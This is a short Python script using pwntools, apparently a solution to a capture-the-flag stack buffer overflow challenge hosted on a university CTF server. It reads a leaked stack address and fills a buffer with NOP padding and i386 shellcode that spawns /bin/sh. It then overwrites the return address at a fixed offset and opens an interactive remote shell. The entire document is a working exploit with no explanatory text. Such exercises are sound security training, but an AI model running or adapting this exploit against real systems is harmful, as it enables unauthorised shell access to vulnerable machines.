#!/bin/env python3

from pwn import *

OFFSET = 108
RET_ADDR_SIZE = 4

p = remote("ctf-fsi.fe.up.pt", 4001)

p.recvuntil([b" is "])

address = p.recvline(keepends=False)[:-1]
address = int(address, 16)

info("Address: " + hex(address))

# PAYLOAD

payload = bytearray(0x90 for i in range(OFFSET + RET_ADDR_SIZE))
shellcode = asm(shellcraft.i386.linux.sh())

info("Shellcode size: " + str(len(shellcode)))

payload[:len(shellcode)] = shellcode
payload[OFFSET:OFFSET + RET_ADDR_SIZE] = p32(address)

# END OF PAYLOAD

p.sendlineafter(b":", payload)
p.interactive()
